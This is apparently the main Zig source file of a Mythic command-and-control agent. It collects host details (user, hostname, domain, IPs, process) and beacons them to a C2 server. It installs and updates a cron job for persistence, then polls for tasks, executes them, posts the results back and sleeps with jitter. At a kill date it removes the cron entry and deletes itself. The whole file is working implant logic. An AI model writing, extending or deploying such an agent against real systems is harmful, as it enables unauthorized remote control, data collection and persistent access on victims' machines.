const std = @import("std");
const base64 = std.base64;
const types = @import("types.zig");
const commands = @import("commands.zig");
const network = @import("network.zig");
const utils = @import("utils.zig");
const config = @import("config.zig");

const print = std.debug.print;
//const ArrayList = std.ArrayList;
const Allocator = std.mem.Allocator;
const Io = std.Io;
const json = std.json;
const time = std.time;

const AgentConfig = types.AgentConfig;
const MythicTask = types.MythicTask;
const MythicResponse = types.MythicResponse;
const TaskStatus = types.TaskStatus;
const CommandExecutor = commands.CommandExecutor;
const NetworkClient = network.NetworkClient;
const SystemInfo = utils.SystemInfo;
const CryptoUtils = utils.CryptoUtils;
const TimeUtils = utils.TimeUtils;
const PersistUtils = utils.PersistUtils;

pub const MythicAgent = struct {
    const Self = @This();

    allocator: Allocator,
    io: Io,
    config: AgentConfig,
    uuid: []const u8,
    session_id: []const u8,
    network_client: NetworkClient,
    command_executor: CommandExecutor,
    system_info: SystemInfo,
    crypto_utils: CryptoUtils,

    aes_key: [32]u8, //For future use watch this space
    payload_uuid: []const u8,

    tasks: std.ArrayList(MythicTask),
    pending_responses: std.ArrayList(MythicResponse),
    is_running: bool,
    last_checkin: Io.Timestamp,

    pub fn init(allocator: Allocator, agent_config: types.AgentConfig, io: Io, environ_map: *std.process.Environ.Map) !Self {
        var crypto_utils = CryptoUtils.init(allocator);

        const session_id = try crypto_utils.generateSessionId(io); //session_id might be useful later. Not implemented yet
        const aes_key = CryptoUtils.generateAESKey(io);

        return Self{
            .allocator = allocator,
            .io = io,
            .config = agent_config,
            .uuid = config.uuid,
            .session_id = session_id,
            .network_client = NetworkClient.init(allocator, agent_config, io),
            .command_executor = CommandExecutor.init(allocator, io),
            .system_info = SystemInfo.init(allocator, io, environ_map),
            .crypto_utils = crypto_utils,
            .aes_key = aes_key,
            .payload_uuid = config.payload_uuid,
            .tasks = std.ArrayList(MythicTask).empty,
            .pending_responses = std.ArrayList(MythicResponse).empty,
            .is_running = false,
            .last_checkin = Io.Timestamp{ .nanoseconds = 0 },
        };
    }

    pub fn deinit(self: *Self) void {
        self.allocator.free(self.session_id);
        self.tasks.deinit(self.allocator);
        self.pending_responses.deinit(self.allocator);
        self.network_client.deinit();
        self.allocator.free(self.payload_uuid);
    }

    pub fn run(self: *Self) !void {
        self.is_running = true;

        try self.checkin();
        // Install persistence after first check-in
        const exepath = try std.process.executablePathAlloc(self.io, self.allocator);
        defer self.allocator.free(exepath);

        //There is a bug where if you use zyra, the path is different from where
        //the agent is. So we'll just install cron only if zyra isn't used
        //This is a temporary workaround until I do a better persistence mechanism
        //We also need to check if the cron entry is different if the binary
        //was moved to a different location. If it was moved, we need to update
        //the cron entry as well.

        const is_zyra = std.mem.startsWith(u8, exepath, "/tmp/zyra");
        const in_mem = std.mem.endsWith(u8, exepath, " (deleted)");

        if (is_zyra or in_mem) {
            print("", .{});
        } else {
            // Here is where we should check if a cron job exists for this exepath
            // If it doesn't, we install one
            const cron_exists = try PersistUtils.getCronEntries(self.allocator, self.io);
            if (cron_exists == null or cron_exists.?.len == 0) {
                PersistUtils.installCron(exepath, self.allocator, self.io) catch |err| {
                    std.debug.print("{}", .{err});
                };
            } else {
                const cron_path = cron_exists.?;
                defer self.allocator.free(cron_path);
                if (!std.mem.eql(u8, cron_path, exepath)) {
                    PersistUtils.updateCronEntry(cron_path, exepath, self.allocator, self.io) catch |err| {
                        std.debug.print("{}", .{err});
                    };
                } else {
                    print("", .{});
                }
            }
        }
        while (self.is_running) {
            if (self.config.kill_date) |kill_date| {
                if (TimeUtils.isKillDateReached(kill_date, self.io)) {
                    //we'll try to make the binary remove persistence and self delete
                    const exe_path = try std.process.executablePathAlloc(self.io, self.allocator);
                    defer self.allocator.free(exe_path);

                    PersistUtils.removeCronEntry(exe_path, self.allocator, self.io) catch |err| {
                        print("{}", .{err});
                    };

                    std.Io.Dir.deleteFileAbsolute(self.io, exe_path) catch |err| {
                        print("{}", .{err});
                    };
                    std.process.exit(0);
                }
            }

            self.getTasks() catch |err| {
                print("{}", .{err});
            };

            try self.processTasks();

            self.sendResponses() catch |err| {
                print("{}", .{err});
            };

            for (self.tasks.items) |*task| {
                task.deinit(self.allocator);
            }

            self.tasks.clearRetainingCapacity();

            try self.sleep();
        }
    }

    fn checkin(self: *Self) !void {
        const user = try self.system_info.getCurrentUser();
        defer self.allocator.free(user);
        const host = try self.system_info.getHostname();
        defer self.allocator.free(host);
        const pid = try self.system_info.getPid();
        defer self.allocator.free(pid);
        const domain = try self.system_info.getDomain();
        defer self.allocator.free(domain);
        const integrity_level = try self.system_info.getIntegrityLevel();
        defer self.allocator.free(integrity_level);
        const external_ip = try self.system_info.getExternalIP();
        defer self.allocator.free(external_ip);
        const internal_ip = try self.system_info.getInternalIP();
        defer self.allocator.free(internal_ip);
        const process_name = try self.system_info.getProcessName();
        defer self.allocator.free(process_name);

        const checkin_data = .{
            .action = "checkin",
            .uuid = self.uuid,
            .user = user,
            .host = host,
            .pid = pid,
            .domain = domain,
            .integrity_level = integrity_level,
            .external_ip = external_ip,
            .ips = internal_ip,
            .process_name = process_name,
        };
        //Writergate made me do this. Thanks Andrew for giving me sleepless nights T_T
        var json_writer = std.Io.Writer.Allocating.init(self.allocator);
        defer json_writer.deinit();
        try std.json.Stringify.value(checkin_data, .{}, &json_writer.writer);
        const json_bytes = try json_writer.toOwnedSlice();
        defer self.allocator.free(json_bytes);

        var combined = std.ArrayList(u8).empty;
        defer combined.deinit(self.allocator);
        try combined.appendSlice(self.allocator, self.payload_uuid);
        try combined.appendSlice(self.allocator, json_bytes);

        const encoder = base64.standard.Encoder;
        const b64_len = encoder.calcSize(combined.items.len);
        const b64_data = try self.allocator.alloc(u8, b64_len);
        defer self.allocator.free(b64_data);
        _ = encoder.encode(b64_data, combined.items);

        const response = try self.network_client.sendRequest("data", b64_data);
        defer self.allocator.free(response);

        const decoded_len = base64.standard.Decoder.calcSizeForSlice(response) catch {
            print("", .{});
            return error.InvalidBase64;
        };
        const decoded_response = try self.allocator.alloc(u8, decoded_len);
        defer self.allocator.free(decoded_response);
        base64.standard.Decoder.decode(decoded_response, response) catch {
            print("", .{});
            return error.InvalidBase64;
        };

        if (response.len < 36) {
            return error.InvalidResponse;
        }
        const json_response = decoded_response[36..];
        const parsed = json.parseFromSlice(json.Value, self.allocator, json_response, .{}) catch |err| {
            print("{}", .{err});
            return err;
        };
        defer parsed.deinit();
        if (parsed.value.object.get("id")) |payload_uuid_value| {
            self.payload_uuid = try self.allocator.dupe(u8, payload_uuid_value.string);
        } else {
            return error.InvalidResponse;
        }

        self.last_checkin = TimeUtils.getCurrentTimestamp(self.io);
    }

    fn getTasks(self: *Self) !void {
        const get_tasking_data = .{
            .action = "get_tasking",
            .tasking_size = 1,
        };

        var json_writer = std.Io.Writer.Allocating.init(self.allocator);
        defer json_writer.deinit();

        try json.Stringify.value(get_tasking_data, .{}, &json_writer.writer);

        const json_bytes = try json_writer.toOwnedSlice();
        defer self.allocator.free(json_bytes);

        var combined = std.ArrayList(u8).empty;
        defer combined.deinit(self.allocator);

        try combined.appendSlice(self.allocator, self.payload_uuid);
        try combined.appendSlice(self.allocator, json_bytes);

        const encoder = base64.standard.Encoder;
        const b64_len = encoder.calcSize(combined.items.len);
        const b64_data = try self.allocator.alloc(u8, b64_len);
        defer self.allocator.free(b64_data);
        _ = encoder.encode(b64_data, combined.items);

        const response = try self.network_client.sendRequest("data", b64_data);
        defer self.allocator.free(response);

        const decoded_len = base64.standard.Decoder.calcSizeForSlice(response) catch {
            print("", .{});
            return error.InvalidBase64;
        };
        const decoded_response = try self.allocator.alloc(u8, decoded_len);
        defer self.allocator.free(decoded_response);

        base64.standard.Decoder.decode(decoded_response, response) catch {
            print("", .{});
            return error.InvalidBase64;
        };

        if (response.len < 36) {
            return error.InvalidResponse;
        }
        const Task = struct {
            id: []const u8,
            command: []const u8,
            timestamp: i64,
            parameters: json.Value,
        };
        const json_response = decoded_response[36..];

        const parsed = json.parseFromSlice(struct { action: []const u8, tasks: []Task }, self.allocator, json_response, .{}) catch |err| {
            print("{}", .{err});
            return err;
        };
        defer parsed.deinit();

        try self.parseTaskResponse(json_response);
    }

    fn parseTaskResponse(self: *Self, response: []const u8) !void {
        const parsed = json.parseFromSlice(json.Value, self.allocator, response, .{}) catch return;
        defer parsed.deinit();

        if (parsed.value.object.get("tasks")) |tasks_value| {
            if (tasks_value.array.items.len > 0) {
                for (tasks_value.array.items) |task_value| {
                    const task_obj = task_value.object;

                    const task = MythicTask{
                        .id = try self.allocator.dupe(u8, task_obj.get("id").?.string),
                        .command = try self.allocator.dupe(u8, task_obj.get("command").?.string),
                        .parameters = try self.allocator.dupe(u8, task_obj.get("parameters").?.string),
                        .timestamp = try std.fmt.allocPrint(self.allocator, "{d}", .{task_obj.get("timestamp").?.integer}),
                    };

                    try self.tasks.append(self.allocator, task);
                }
            }
        }
    }

    fn processTasks(self: *Self) !void {
        for (self.tasks.items) |*task| {
            if (task.status == .submitted) {
                task.status = .processing;

                if (std.mem.eql(u8, task.command, "exit")) {
                    self.is_running = false;
                    const exit_response = MythicResponse{
                        .task_id = task.id,
                        .user_output = try self.allocator.dupe(u8, "Agent terminating..."),
                        .completed = true,
                        .status = "completed",
                    };
                    try self.pending_responses.append(self.allocator, exit_response);
                    task.status = .completed;
                    continue;
                }

                const result = self.command_executor.executeTask(task.*) catch |err| {
                    const error_response = MythicResponse{
                        .task_id = task.id,
                        .user_output = try std.fmt.allocPrint(self.allocator, "{}", .{err}),
                        .completed = true,
                        .status = "error",
                    };
                    try self.pending_responses.append(self.allocator, error_response);
                    task.status = .erroragent;
                    continue;
                };

                try self.pending_responses.append(self.allocator, result);
                task.status = .completed;
            }
        }
    }

    fn sendResponses(self: *Self) !void {
        if (self.pending_responses.items.len == 0) return;

        const ResponseObj = struct {
            task_id: []const u8,
            user_output: ?[]const u8 = null,
            completed: bool = true,
            status: []const u8,
            download: ?types.DownloadInfo = null,
        };

        var responses = std.ArrayList(ResponseObj).empty;
        defer responses.deinit(self.allocator);

        for (self.pending_responses.items) |response| {
            try responses.append(self.allocator, ResponseObj{
                .task_id = response.task_id,
                .user_output = response.user_output,
                .completed = response.completed,
                .status = response.status,
                .download = response.download,
            });
        }

        const response_data = .{
            .action = "post_response",
            .responses = responses.items,
        };

        var json_writer = std.Io.Writer.Allocating.init(self.allocator);
        defer json_writer.deinit();
        try json.Stringify.value(response_data, .{}, &json_writer.writer);

        const json_bytes = try json_writer.toOwnedSlice();
        defer self.allocator.free(json_bytes);

        var combined = std.ArrayList(u8).empty;
        defer combined.deinit(self.allocator);

        try combined.appendSlice(self.allocator, self.payload_uuid);
        try combined.appendSlice(self.allocator, json_bytes);

        const encoder = base64.standard.Encoder;
        const b64_len = encoder.calcSize(combined.items.len);
        const b64_data = try self.allocator.alloc(u8, b64_len);
        defer self.allocator.free(b64_data);
        _ = encoder.encode(b64_data, combined.items);

        const server_response = try self.network_client.sendRequest("data", b64_data);
        defer self.allocator.free(server_response);

        for (self.pending_responses.items) |*response| {
            response.deinit(self.allocator);
        }

        self.pending_responses.clearRetainingCapacity();
    }

    fn sleep(self: *Self) !void {
        const sleep_time = TimeUtils.calculateJitteredSleep(self.config.sleep_interval, self.config.jitter, self.io);
        try TimeUtils.sleep(self.io, sleep_time);
    }
};
